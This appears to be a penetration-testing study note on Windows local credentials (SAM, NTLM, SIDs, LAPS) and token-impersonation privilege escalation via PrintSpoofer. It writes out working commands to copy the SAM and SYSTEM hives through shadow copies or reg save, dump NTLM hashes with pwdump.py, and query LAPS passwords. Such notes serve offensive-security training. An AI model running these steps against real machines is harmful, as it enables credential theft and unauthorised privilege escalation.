## Local Windows Credentials

Local Windows credentials are stored in the Security Account Manager (SAM) database password hashes using the NTLM hashing format, which is based on MD4 algorithm. The windows has a build in
Administrator account. The account is disabled by defult on window workstation since Vista. Howevere, the account is enabled on servers by default. This could be an possible attack factor.
All Windows account has a unique Security Identifier(SID) with the following format. 

```
S-R-X-Y1-Y2-Yn-1-Yn
```

```
|Comment |Description
|S       | Indicates that the string is a SID
|R       | Indicates the revision level
|X       | Indicates the identifier authority value
|Y       | Represents a series of subauthority values, where n is the number of values
```

#### Copy SAM

We can use Volume Shadow Copy Server to create a snapshot of the lical hard drive. And copy the sam from local hard drive.

Create a snapshot, and verify with vssadmin
```
C:\> wmic shadowcopy call create Volume='C:\'

C:\> vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.
Contents of shadow copy set ID: {8e3a3a18-93a6-4b18-bc54-7639a9baf7b2}
Contained 1 shadow copies at creation time: 11/14/2019 6:53:26 AM
Shadow Copy ID: {13fb63f9-f631-408a-b876-9032a9609c22}
Original Volume: (C:)\\?\Volume{a74776de-f90e-4e66-bbeb-1e507d7fa0d4}\
Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

Copy sam databsae from shadows, and copy the encryption keys from system file(neeed to create s shadow copy first)
```
C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam

C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system
```

We can also copy sam and system file from reg key

```
C:\> reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
C:\> reg save HKLM\system C:\users\offsec.corp1\Downloads\system
```

Now we can decrypt and dump NTLM hash with [creddump.py](https://github.com/CiscoCXSecurity/creddump7)
```
kali@kali:~/creddump7$ python pwdump.py /home/kali/system /home/kali/sam
```

In 2015, Microsoft released Local Administrator Password Solution (LAPS), which offered a
secure and scalable way of remotely managing the local administrator password for domainjoined computers. If LAPS is in use, we should try to gain access to the clear text passwords in Active Directory.

we can use the [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) PowerShell script

```
PS C:\Tools> Import-Module .\LAPSToolkit.ps1
PS C:\Tools> Get-LAPSComputers
```
## Access Token and Elevation with Impersonation token

An access token is created by the kernel upon user authentication and contains important values that are linked to a specific user through the SID. Local administrators receive two access tokens when authenticating. The first (which is used by default) is configured to create processes as medium integrity. When a user selects the “Run as administrator” option for an application, the second elevated token is used instead. The User Account Control (UAC) mechanism links these two tokens to a single user and
creates the consent prompt.

Privileges are also included in the access token. if the present privileges are enabled or disabled and may be
dynamically updated through the Win32 AdjustTokenPrivileges API. For example, a user has SeShutdownPrivilege disabled, if the user oose to shut down the computer through the shutdown command the back-end code will enable the privilege with AdjustTokenPrivileges and then perform the required actions to power off the operating system. We can add/update accounts's permission/token though **secpol.msc**.

There are many different token privilege escalation ttp discussed in this [blog](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/). We create a c# code [PrintSpooferNet]() that allow us to escalate permission to system account when the current user has SeImpersonatePrivilege.

Our PrintSpooferNet code use [PrintSpoofer attack](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) that relies on windows pipes. The attack is based on the fact that the print spooler monitors printer object changes and sends change notifications to print clients by connecting to their respective named pipes. If we can create a process running with the SeImpersonatePrivilege privilege that simulates a print client,
we will obtain a SYSTEM token that we can impersonate.

A pipe is a section of shared memory inside the kernel that processes can use for communication. One process can create a pipe (the pipe server) while other processes can
connect to the pipe (pipe clients) and read/write information from/to it, depending on the permission.
page 482
